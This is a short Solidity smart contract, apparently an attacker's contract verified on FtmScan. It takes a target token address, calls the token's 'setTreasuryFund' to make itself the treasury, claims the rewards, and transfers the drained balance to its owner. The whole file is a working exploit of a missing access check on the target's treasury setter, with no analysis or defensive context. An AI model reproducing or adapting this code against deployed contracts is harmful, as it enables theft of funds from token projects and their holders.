/**
 *Submitted for verification at FtmScan.com on 2022-02-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

interface IERC20 {
    function setTreasuryFund(address _treasuryFund) external;
    function claimRewards() external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract a {
    address private owner;
    constructor() {
        owner = msg.sender;
    }

    IERC20 token;


    
    function contactthing(address _add) public {
        require(msg.sender == owner);
        token = IERC20(_add); 
    }

    function gain() public{
        token.setTreasuryFund(address(this));
        token.claimRewards();
        token.transfer(owner, token.balanceOf(address(this)));
    }
}